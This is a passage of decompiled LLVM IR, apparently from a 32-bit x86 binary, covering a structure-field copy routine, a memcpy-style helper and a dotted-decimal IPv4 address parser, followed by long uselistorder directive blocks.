  %v3_8054915 = load i16, i16* %v2_8054915, align 2
  %v4_8054915 = zext i16 %v3_8054915 to i32
  store i32 %v4_8054915, i32* %eax.global-to-local, align 4
  %v1_8054919 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054919 = add i32 %v1_8054919, 20
  %v3_8054919 = inttoptr i32 %v2_8054919 to i32*
  store i32 %v4_8054915, i32* %v3_8054919, align 4
  %v0_805491c = load i32, i32* %esi.global-to-local, align 4
  %v1_805491c = add i32 %v0_805491c, 12
  %v2_805491c = inttoptr i32 %v1_805491c to i16*
  %v3_805491c = load i16, i16* %v2_805491c, align 2
  %v4_805491c = zext i16 %v3_805491c to i32
  store i32 %v4_805491c, i32* %eax.global-to-local, align 4
  %v1_8054920 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054920 = add i32 %v1_8054920, 24
  %v3_8054920 = inttoptr i32 %v2_8054920 to i32*
  store i32 %v4_805491c, i32* %v3_8054920, align 4
  %v0_8054923 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054923 = add i32 %v0_8054923, 14
  %v2_8054923 = inttoptr i32 %v1_8054923 to i16*
  %v3_8054923 = load i16, i16* %v2_8054923, align 2
  %v4_8054923 = zext i16 %v3_8054923 to i32
  store i32 %v4_8054923, i32* %eax.global-to-local, align 4
  %v1_8054927 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054927 = add i32 %v1_8054927, 28
  %v3_8054927 = inttoptr i32 %v2_8054927 to i32*
  store i32 %v4_8054923, i32* %v3_8054927, align 4
  %v0_805492a = load i32, i32* %esi.global-to-local, align 4
  %v1_805492a = add i32 %v0_805492a, 16
  %v2_805492a = inttoptr i32 %v1_805492a to i16*
  %v3_805492a = load i16, i16* %v2_805492a, align 2
  %v4_805492a = zext i16 %v3_805492a to i32
  store i32 %v4_805492a, i32* %eax.global-to-local, align 4
  %v0_805492e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805492e = add i32 %v0_805492e, 36
  %v2_805492e = inttoptr i32 %v1_805492e to i32*
  store i32 0, i32* %v2_805492e, align 4
  %v0_8054935 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054935 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054935 = add i32 %v1_8054935, 32
  %v3_8054935 = inttoptr i32 %v2_8054935 to i32*
  store i32 %v0_8054935, i32* %v3_8054935, align 4
  %v0_8054938 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054938 = add i32 %v0_8054938, 20
  %v2_8054938 = inttoptr i32 %v1_8054938 to i32*
  %v3_8054938 = load i32, i32* %v2_8054938, align 4
  store i32 %v3_8054938, i32* %eax.global-to-local, align 4
  %v1_805493b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805493b = add i32 %v1_805493b, 44
  %v3_805493b = inttoptr i32 %v2_805493b to i32*
  store i32 %v3_8054938, i32* %v3_805493b, align 4
  %v0_805493e = load i32, i32* %esi.global-to-local, align 4
  %v1_805493e = add i32 %v0_805493e, 24
  %v2_805493e = inttoptr i32 %v1_805493e to i32*
  %v3_805493e = load i32, i32* %v2_805493e, align 4
  store i32 %v3_805493e, i32* %eax.global-to-local, align 4
  %v1_8054941 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054941 = add i32 %v1_8054941, 48
  %v3_8054941 = inttoptr i32 %v2_8054941 to i32*
  store i32 %v3_805493e, i32* %v3_8054941, align 4
  %v0_8054944 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054944 = add i32 %v0_8054944, 28
  %v2_8054944 = inttoptr i32 %v1_8054944 to i32*
  %v3_8054944 = load i32, i32* %v2_8054944, align 4
  store i32 %v3_8054944, i32* %eax.global-to-local, align 4
  %v1_8054947 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054947 = add i32 %v1_8054947, 52
  %v3_8054947 = inttoptr i32 %v2_8054947 to i32*
  store i32 %v3_8054944, i32* %v3_8054947, align 4
  %v0_805494a = load i32, i32* %esi.global-to-local, align 4
  %v1_805494a = add i32 %v0_805494a, 32
  %v2_805494a = inttoptr i32 %v1_805494a to i32*
  %v3_805494a = load i32, i32* %v2_805494a, align 4
  store i32 %v3_805494a, i32* %eax.global-to-local, align 4
  %v1_805494d = load i32, i32* %ebx.global-to-local, align 4
  %v2_805494d = add i32 %v1_805494d, 56
  %v3_805494d = inttoptr i32 %v2_805494d to i32*
  store i32 %v3_805494a, i32* %v3_805494d, align 4
  %v0_8054950 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054950 = add i32 %v0_8054950, 40
  %v2_8054950 = inttoptr i32 %v1_8054950 to i32*
  %v3_8054950 = load i32, i32* %v2_8054950, align 4
  store i32 %v3_8054950, i32* %eax.global-to-local, align 4
  %v1_8054953 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054953 = add i32 %v1_8054953, 64
  %v3_8054953 = inttoptr i32 %v2_8054953 to i32*
  store i32 %v3_8054950, i32* %v3_8054953, align 4
  %v0_8054956 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054956 = add i32 %v0_8054956, 48
  %v2_8054956 = inttoptr i32 %v1_8054956 to i32*
  %v3_8054956 = load i32, i32* %v2_8054956, align 4
  store i32 %v3_8054956, i32* %eax.global-to-local, align 4
  %v1_8054959 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054959 = add i32 %v1_8054959, 72
  %v3_8054959 = inttoptr i32 %v2_8054959 to i32*
  store i32 %v3_8054956, i32* %v3_8054959, align 4
  %v2_805495f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805495f, i32* @ebx, align 4
  ret i32 %v3_8054956

; uselistorder directives
  uselistorder i32 72, { 4, 3, 5, 0, 6, 7, 8, 1, 9, 10, 11, 12, 2 }
  uselistorder i32 64, { 11, 10, 6, 5, 0, 1, 7, 2, 12, 13, 4, 8, 3, 9 }
  uselistorder i32 40, { 10, 5, 11, 6, 0, 7, 8, 9, 1, 3, 12, 2, 13, 14, 15, 16, 4 }
  uselistorder i32 56, { 9, 8, 0, 1, 2, 3, 4, 5, 10, 11, 12, 13, 14, 6, 15, 16, 17, 7 }
  uselistorder i32 52, { 6, 5, 8, 9, 2, 3, 0, 7, 4, 1 }
  uselistorder i32 48, { 14, 15, 12, 7, 11, 1, 6, 8, 2, 3, 9, 0, 10, 13, 4, 16, 17, 18, 19, 20, 5 }
  uselistorder i32 32, { 58, 59, 63, 37, 48, 64, 65, 60, 34, 52, 53, 66, 1, 0, 2, 3, 43, 4, 5, 6, 7, 8, 38, 67, 39, 44, 45, 49, 46, 47, 35, 10, 9, 12, 11, 13, 14, 41, 40, 50, 51, 54, 55, 15, 56, 17, 16, 42, 57, 61, 36, 62, 68, 18, 19, 20, 21, 69, 22, 23, 70, 71, 25, 24, 27, 26, 28, 29, 72, 30, 31, 73, 74, 75, 32, 33, 76 }
  uselistorder i32 36, { 5, 4, 0, 2, 6, 7, 1, 8, 9, 10, 11, 3 }
  uselistorder i32 14, { 5, 1, 3, 0, 2, 10, 11, 6, 7, 8, 9, 4 }
  uselistorder i32 24, { 46, 47, 18, 44, 45, 54, 48, 49, 50, 7, 8, 0, 1, 14, 35, 31, 9, 12, 19, 13, 20, 21, 10, 37, 32, 22, 11, 23, 36, 24, 25, 26, 27, 28, 29, 30, 33, 34, 38, 39, 40, 43, 42, 41, 15, 2, 51, 52, 53, 5, 16, 4, 3, 55, 17, 6 }
  uselistorder i32 20, { 28, 29, 10, 18, 26, 27, 41, 30, 31, 32, 33, 0, 1, 17, 12, 15, 16, 13, 19, 14, 20, 21, 22, 23, 24, 25, 2, 3, 34, 35, 36, 4, 5, 37, 38, 39, 42, 40, 9, 7, 8, 6, 43, 44, 45, 11 }
  uselistorder i32 16, { 80, 81, 82, 83, 84, 85, 86, 87, 20, 52, 3, 88, 33, 116, 4, 67, 68, 69, 0, 5, 117, 118, 7, 6, 119, 1, 8, 89, 90, 21, 34, 51, 27, 35, 28, 36, 11, 12, 44, 53, 54, 10, 60, 39, 42, 43, 40, 56, 41, 45, 55, 46, 13, 38, 37, 57, 58, 59, 61, 62, 63, 47, 64, 29, 65, 22, 70, 71, 72, 73, 74, 75, 76, 77, 78, 30, 14, 79, 23, 24, 31, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 49, 106, 25, 26, 107, 108, 109, 110, 111, 9, 32, 66, 112, 113, 114, 120, 115, 121, 125, 16, 126, 127, 128, 129, 130, 131, 132, 122, 123, 124, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 2, 143, 144, 145, 146, 147, 148, 149, 150, 19, 151, 17, 18, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 15, 174, 50, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 48 }
  uselistorder i32 8, { 116, 117, 118, 119, 120, 121, 122, 123, 124, 54, 130, 55, 131, 94, 56, 95, 11, 133, 134, 135, 136, 137, 138, 139, 4, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 5, 104, 105, 106, 107, 108, 109, 110, 111, 150, 151, 152, 153, 154, 155, 63, 6, 64, 7, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 62, 173, 174, 8, 175, 176, 177, 178, 9, 179, 125, 126, 127, 128, 132, 58, 65, 59, 66, 60, 67, 180, 181, 182, 68, 99, 98, 12, 96, 100, 101, 102, 13, 103, 112, 113, 114, 115, 14, 15, 16, 17, 18, 10, 69, 0, 19, 20, 129, 70, 71, 21, 72, 73, 22, 23, 74, 24, 1, 2, 183, 51, 184, 29, 30, 28, 35, 185, 27, 33, 34, 75, 61, 76, 77, 31, 78, 32, 79, 3, 25, 52, 186, 36, 80, 37, 81, 38, 39, 40, 41, 82, 42, 43, 44, 83, 45, 84, 187, 85, 46, 86, 47, 87, 188, 88, 48, 89, 49, 90, 91, 92, 50, 26, 189, 53, 190, 93, 97, 57 }
  uselistorder i32 (i8*, i32, i32)* @function_805276a, { 7, 4, 5, 6, 0, 1, 2, 3, 8 }
  uselistorder i32 88, { 0, 2, 1, 3 }
}

define i32 @function_8054962(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8054962:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8054963 = load i32, i32* @esi, align 4
  store i32 %v0_8054963, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_8054964 = sdiv i32 %sext, 16777216
  store i32 %v4_8054964, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805496e = ptrtoint i16* %arg1 to i32
  store i32 %v4_805496e, i32* %edi.global-to-local, align 4
  %v2_8054972 = udiv i32 %v4_8054964, 4
  %v3_8054975 = inttoptr i32 %arg2 to i8*
  %v4_8054975 = bitcast i16* %arg1 to i8*
  %v5_8054975 = call i8* @_memcpy(i8* %v4_8054975, i8* %v3_8054975, i32 %v2_8054972)
  %v0_8054977 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054977 = and i32 %v0_8054977, 2
  %v3_8054977 = icmp eq i32 %v2_8054977, 0
  br i1 %v3_8054977, label %dec_label_pc_805497d, label %dec_label_pc_805497b

dec_label_pc_805497b:                             ; preds = %dec_label_pc_8054962
  %v0_805497b = load i32, i32* %esi.global-to-local, align 4
  %v1_805497b = inttoptr i32 %v0_805497b to i16*
  %v2_805497b = load i16, i16* %v1_805497b, align 2
  %v3_805497b = load i32, i32* %edi.global-to-local, align 4
  %v4_805497b = inttoptr i32 %v3_805497b to i16*
  store i16 %v2_805497b, i16* %v4_805497b, align 2
  %v5_805497b = load i32, i32* %edi.global-to-local, align 4
  %v6_805497b = load i32, i32* %esi.global-to-local, align 4
  %v7_805497b = load i1, i1* @df, align 1
  %v8_805497b = select i1 %v7_805497b, i32 -2, i32 2
  %v9_805497b = add i32 %v8_805497b, %v5_805497b
  %v10_805497b = add i32 %v8_805497b, %v6_805497b
  store i32 %v9_805497b, i32* %edi.global-to-local, align 4
  store i32 %v10_805497b, i32* %esi.global-to-local, align 4
  %v0_805497d.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805497d

dec_label_pc_805497d:                             ; preds = %dec_label_pc_8054962, %dec_label_pc_805497b
  %v0_805497d = phi i32 [ %v0_8054977, %dec_label_pc_8054962 ], [ %v0_805497d.pre, %dec_label_pc_805497b ]
  %v2_805497d = urem i32 %v0_805497d, 2
  %v3_805497d = icmp eq i32 %v2_805497d, 0
  br i1 %v3_805497d, label %dec_label_pc_8054982, label %dec_label_pc_8054981

dec_label_pc_8054981:                             ; preds = %dec_label_pc_805497d
  %v0_8054981 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054981 = inttoptr i32 %v0_8054981 to i8*
  %v2_8054981 = load i8, i8* %v1_8054981, align 1
  %v3_8054981 = load i32, i32* %edi.global-to-local, align 4
  %v4_8054981 = inttoptr i32 %v3_8054981 to i8*
  store i8 %v2_8054981, i8* %v4_8054981, align 1
  %v5_8054981 = load i32, i32* %edi.global-to-local, align 4
  %v6_8054981 = load i32, i32* %esi.global-to-local, align 4
  %v7_8054981 = load i1, i1* @df, align 1
  %v8_8054981 = select i1 %v7_8054981, i32 -1, i32 1
  %v9_8054981 = add i32 %v8_8054981, %v5_8054981
  %v10_8054981 = add i32 %v8_8054981, %v6_8054981
  store i32 %v9_8054981, i32* %edi.global-to-local, align 4
  store i32 %v10_8054981, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054982

dec_label_pc_8054982:                             ; preds = %dec_label_pc_805497d, %dec_label_pc_8054981
  store i32 %v4_805496e, i32* %eax.global-to-local, align 4
  %v2_8054986 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054986, i32* @esi, align 4
  ret i32 %v4_805496e

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 4, 1, 3, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 -2, { 19, 18, 20, 17, 21, 0, 1, 4, 7, 8, 5, 3, 2, 6, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i1* @df, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 4, { 2, 180, 181, 182, 183, 184, 185, 235, 236, 238, 239, 240, 241, 242, 237, 56, 94, 243, 245, 246, 248, 251, 252, 253, 254, 255, 256, 3, 257, 258, 259, 260, 261, 262, 263, 264, 249, 250, 159, 59, 160, 161, 162, 163, 164, 165, 166, 4, 168, 167, 265, 5, 266, 58, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 9, 287, 288, 290, 289, 6, 247, 244, 98, 63, 186, 187, 188, 189, 190, 60, 64, 291, 292, 65, 105, 106, 66, 107, 108, 109, 132, 133, 134, 137, 138, 139, 140, 141, 142, 129, 130, 110, 111, 143, 144, 145, 119, 120, 121, 99, 100, 101, 116, 117, 118, 122, 123, 124, 125, 126, 127, 146, 147, 102, 103, 104, 112, 113, 114, 115, 13, 128, 131, 95, 148, 156, 157, 158, 149, 135, 136, 61, 155, 14, 150, 62, 151, 152, 153, 154, 169, 170, 171, 96, 172, 173, 15, 174, 175, 176, 16, 17, 18, 19, 177, 67, 68, 178, 179, 69, 57, 191, 0, 192, 193, 194, 195, 196, 197, 20, 21, 198, 70, 199, 71, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 22, 72, 73, 212, 213, 214, 215, 216, 217, 218, 23, 219, 220, 221, 222, 24, 74, 223, 224, 225, 226, 25, 293, 294, 227, 228, 229, 230, 231, 232, 233, 234, 8, 295, 296, 297, 52, 30, 31, 29, 36, 28, 34, 35, 298, 299, 300, 10, 75, 76, 77, 32, 78, 33, 79, 1, 301, 26, 302, 53, 11, 303, 37, 80, 38, 81, 39, 304, 40, 41, 42, 82, 43, 44, 45, 83, 46, 84, 85, 47, 86, 48, 87, 305, 88, 49, 89, 50, 90, 306, 91, 92, 307, 51, 308, 309, 310, 311, 313, 312, 314, 315, 316, 317, 318, 319, 320, 321, 322, 27, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 54, 12, 7, 350, 55, 93, 351, 97 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* @esi, { 121, 122, 38, 39, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 2, 78, 79, 123, 124, 13, 125, 126, 127, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 128, 129, 130, 144, 148, 3, 149, 150, 151, 152, 153, 154, 155, 145, 146, 147, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 156, 157, 158, 159, 160, 161, 162, 0, 163, 164, 165, 166, 4, 167, 10, 168, 169, 170, 171, 172, 173, 80, 81, 5, 82, 83, 84, 85, 86, 87, 88, 89, 142, 143, 174, 175, 14, 17, 18, 19, 29, 30, 25, 31, 23, 15, 22, 24, 32, 26, 16, 20, 21, 27, 28, 33, 34, 35, 36, 37, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 111, 110, 1, 112, 113, 114, 115, 11, 116, 176, 177, 178, 117, 118, 119, 9, 179, 180, 120, 181, 182, 6, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 7, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 12, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 8, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 283, 280, 281, 282, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304 }
  uselistorder label %dec_label_pc_8054982, { 1, 0 }
  uselistorder label %dec_label_pc_805497d, { 1, 0 }
}

define i32 @function_8054989(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8054989:
  %v1_8054994 = icmp eq i8* %arg1, null
  br i1 %v1_8054994, label %dec_label_pc_8054a15, label %dec_label_pc_8054998

dec_label_pc_8054998:                             ; preds = %dec_label_pc_8054989
  %v4_8054990 = ptrtoint i8* %arg1 to i32
  %v0_80549a6.pre = load i32, i32* bitcast (i32** @global_var_805684c.230 to i32*), align 4
  br label %dec_label_pc_80549a3

dec_label_pc_80549a3:                             ; preds = %dec_label_pc_8054998, %dec_label_pc_80549ec
  %v0_80549ec = phi i32 [ 0, %dec_label_pc_8054998 ], [ %v2_80549f2, %dec_label_pc_80549ec ]
  %v2_80549ef = phi i32 [ 1, %dec_label_pc_8054998 ], [ %v3_80549ef, %dec_label_pc_80549ec ]
  %v0_80549a3 = phi i32 [ %v4_8054990, %dec_label_pc_8054998 ], [ %v0_80549a33, %dec_label_pc_80549ec ]
  %v1_80549a3 = inttoptr i32 %v0_80549a3 to i8*
  %v2_80549a3 = load i8, i8* %v1_80549a3, align 1
  %v3_80549a3 = sext i8 %v2_80549a3 to i32
  %v2_80549ac = mul nsw i32 %v3_80549a3, 2
  %v3_80549ac = add i32 %v2_80549ac, %v0_80549a6.pre
  %v4_80549ac = inttoptr i32 %v3_80549ac to i8*
  %v5_80549ac = load i8, i8* %v4_80549ac, align 1
  %v6_80549ac = and i8 %v5_80549ac, 8
  %v7_80549ac = icmp eq i8 %v6_80549ac, 0
  br i1 %v7_80549ac, label %dec_label_pc_8054a15, label %dec_label_pc_80549b3

dec_label_pc_80549b3:                             ; preds = %dec_label_pc_80549a3
  %v4_80549c7.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80549c7

dec_label_pc_80549b7:                             ; preds = %dec_label_pc_80549c7
  %v3_80549b7 = mul i32 %v1_80549b7, 10
  %v2_80549ba = add i32 %v3_80549b7, -48
  %v3_80549ba = add i32 %v2_80549ba, %v2_80549c9
  %v1_80549be = add i32 %v3_80549ba, -255
  %v6_80549be = sub i32 254, %v3_80549ba
  %v7_80549be = and i32 %v6_80549be, %v3_80549ba
  %v8_80549be = icmp slt i32 %v7_80549be, 0
  %v9_80549be = icmp eq i32 %v1_80549be, 0
  %v10_80549be = icmp slt i32 %v1_80549be, 0
  %v3_80549c4 = icmp eq i1 %v10_80549be, %v8_80549be
  %v4_80549c4 = icmp eq i1 %v9_80549be, false
  %v5_80549c4 = and i1 %v4_80549c4, %v3_80549c4
  br i1 %v5_80549c4, label %dec_label_pc_8054a15, label %dec_label_pc_80549c6

dec_label_pc_80549c6:                             ; preds = %dec_label_pc_80549b7
  %v1_80549c6 = add i32 %v0_80549c6, 1
  br label %dec_label_pc_80549c7

dec_label_pc_80549c7:                             ; preds = %dec_label_pc_80549b3, %dec_label_pc_80549c6
  %v1_80549b7 = phi i32 [ 0, %dec_label_pc_80549b3 ], [ %v3_80549ba, %dec_label_pc_80549c6 ]
  %v4_80549c7 = phi i32 [ %v4_80549c7.pre, %dec_label_pc_80549b3 ], [ %v6_80549c7, %dec_label_pc_80549c6 ]
  %v0_80549c6 = phi i32 [ %v0_80549a3, %dec_label_pc_80549b3 ], [ %v1_80549c6, %dec_label_pc_80549c6 ]
  %v1_80549c7 = inttoptr i32 %v0_80549c6 to i8*
  %v2_80549c7 = load i8, i8* %v1_80549c7, align 1
  %v3_80549c7 = zext i8 %v2_80549c7 to i32
  %v5_80549c7 = and i32 %v4_80549c7, -256
  %v6_80549c7 = or i32 %v3_80549c7, %v5_80549c7
  store i32 %v6_80549c7, i32* @edx, align 4
  %v2_80549c9 = sext i8 %v2_80549c7 to i32
  %v2_80549cc = mul nsw i32 %v2_80549c9, 2
  %v3_80549cc = add i32 %v2_80549cc, %v0_80549a6.pre
  %v4_80549cc = inttoptr i32 %v3_80549cc to i16*
  %v5_80549cc = load i16, i16* %v4_80549cc, align 2
  %v2_80549d1 = and i16 %v5_80549cc, 8
  %v3_80549d1 = icmp eq i16 %v2_80549d1, 0
  %v1_80549d3 = icmp eq i1 %v3_80549d1, false
  br i1 %v1_80549d3, label %dec_label_pc_80549b7, label %dec_label_pc_80549d5

dec_label_pc_80549d5:                             ; preds = %dec_label_pc_80549c7
  %v8_80549d5 = sub nsw i32 2, %v2_80549ef
  %v9_80549d5 = and i32 %v8_80549d5, %v2_80549ef
  %v10_80549d5 = icmp slt i32 %v9_80549d5, 0
  %v11_80549d5 = icmp eq i32 %v2_80549ef, 3
  %v12_80549d5 = icmp slt i32 %v2_80549ef, 3
  %v3_80549d9 = icmp eq i1 %v12_80549d5, %v10_80549d5
  %v4_80549d9 = icmp eq i1 %v11_80549d5, false
  %v5_80549d9 = and i1 %v4_80549d9, %v3_80549d9
  br i1 %v5_80549d9, label %dec_label_pc_80549e3, label %dec_label_pc_80549db

dec_label_pc_80549db:                             ; preds = %dec_label_pc_80549d5
  %v10_80549db = icmp eq i8 %v2_80549c7, 46
  %v1_80549de = icmp eq i1 %v10_80549db, false
  br i1 %v1_80549de, label %dec_label_pc_8054a15, label %dec_label_pc_80549e0

dec_label_pc_80549e0:                             ; preds = %dec_label_pc_80549db
  %v1_80549e0 = add i32 %v0_80549c6, 1
  br label %dec_label_pc_80549ec

dec_label_pc_80549e3:                             ; preds = %dec_label_pc_80549d5
  %v1_80549e3 = add i32 %v0_80549c6, 1
  %v4_80549e4 = icmp eq i8 %v2_80549c7, 0
  br i1 %v4_80549e4, label %dec_label_pc_80549ec, label %dec_label_pc_80549e8

dec_label_pc_80549e8:                             ; preds = %dec_label_pc_80549e3
  %v2_80549e8 = and i16 %v5_80549cc, 32
  %v3_80549e8 = icmp eq i16 %v2_80549e8, 0
  br i1 %v3_80549e8, label %dec_label_pc_8054a15, label %dec_label_pc_80549ec

dec_label_pc_80549ec:                             ; preds = %dec_label_pc_80549e8, %dec_label_pc_80549e3, %dec_label_pc_80549e0
  %v0_80549a33 = phi i32 [ %v1_80549e3, %dec_label_pc_80549e8 ], [ %v1_80549e3, %dec_label_pc_80549e3 ], [ %v1_80549e0, %dec_label_pc_80549e0 ]
  %v2_80549ec = mul i32 %v0_80549ec, 256
  %v3_80549ef = add nuw nsw i32 %v2_80549ef, 1
  %v2_80549f2 = or i32 %v1_80549b7, %v2_80549ec
  %v7_80549f8 = icmp sgt i32 %v2_80549ef, 3
  br i1 %v7_80549f8, label %dec_label_pc_80549fa, label %dec_label_pc_80549a3

dec_label_pc_80549fa:                             ; preds = %dec_label_pc_80549ec
  %v4_80549ff = icmp eq i32 %arg2, 0
  br i1 %v4_80549ff, label %dec_label_pc_8054a17, label %dec_label_pc_8054a06

dec_label_pc_8054a06:                             ; preds = %dec_label_pc_80549fa
  %v1_8054a0a = call i32 @llvm.bswap.i32(i32 %v2_80549f2)
  %v2_8054a0c = inttoptr i32 %arg2 to i32*
  store i32 %v1_8054a0a, i32* %v2_8054a0c, align 4
  br label %dec_label_pc_8054a17

dec_label_pc_8054a15:                             ; preds = %dec_label_pc_80549e8, %dec_label_pc_80549db, %dec_label_pc_80549a3, %dec_label_pc_80549b7, %dec_label_pc_8054989
  br label %dec_label_pc_8054a17

dec_label_pc_8054a17:                             ; preds = %dec_label_pc_80549fa, %dec_label_pc_8054a06, %dec_label_pc_8054a15
  %v0_8054a1c = phi i32 [ 1, %dec_label_pc_80549fa ], [ 1, %dec_label_pc_8054a06 ], [ 0, %dec_label_pc_8054a15 ]
  ret i32 %v0_8054a1c

; uselistorder directives
  uselistorder i32 %v2_80549c9, { 1, 0 }
  uselistorder i32 %v6_80549c7, { 1, 0 }
  uselistorder i8 %v2_80549c7, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80549c6, { 0, 1, 3, 2 }
  uselistorder i32 %v1_80549be, { 1, 0 }
  uselistorder i32 %v3_80549ba, { 1, 0, 3, 2 }
  uselistorder i32 %v2_80549ef, { 1, 4, 2, 0, 3, 5 }
  uselistorder i32 256, { 1, 23, 27, 24, 2, 3, 4, 5, 0, 6, 7, 28, 21, 8, 9, 11, 10, 22, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 26 }
  uselistorder i32 3, { 1, 2, 0, 29, 15, 32, 6, 7, 11, 3, 8, 12, 4, 20, 21, 22, 23, 24, 25, 26, 16, 9, 27, 28, 13, 14, 10, 30, 31, 5, 33, 18, 19, 34, 17 }
  uselistorder i16 0, { 0, 1, 7, 8, 4, 5, 6, 2, 3 }
  uselistorder i32 -256, { 4, 38, 39, 40, 41, 42, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 8, 9, 23, 10, 13, 15, 24, 17, 18, 19, 5, 6, 7, 11, 12, 14, 16, 20, 21, 22, 27, 25, 26, 28, 29, 30, 31, 32, 33, 34, 35, 2, 3, 36, 37, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 68, 69, 70, 71, 0, 72, 73, 74, 1, 75, 76, 77, 78, 79 }
  uselistorder i32 -48, { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32 10, { 1, 20, 21, 15, 22, 2, 27, 9, 0, 4, 10, 5, 11, 6, 12, 3, 13, 18, 17, 16, 14, 19, 23, 24, 25, 7, 26, 8, 28, 29, 30 }
  uselistorder i32* @edx, { 23, 3, 68, 69, 70, 32, 18, 0, 20, 21, 55, 56, 57, 58, 19, 71, 72, 73, 74, 77, 76, 78, 86, 87, 4, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 5, 101, 102, 84, 85, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 6, 49, 50, 51, 103, 148, 149, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 7, 141, 142, 143, 144, 145, 146, 147, 83, 22, 80, 59, 60, 150, 82, 61, 75, 79, 62, 81, 151, 152, 1, 153, 154, 155, 8, 156, 157, 158, 159, 160, 161, 162, 9, 163, 15, 24, 25, 26, 27, 13, 14, 11, 10, 28, 16, 29, 12, 31, 30, 52, 53, 54, 17, 63, 64, 65, 66, 67, 2, 164, 165, 166, 167, 168, 169, 170 }
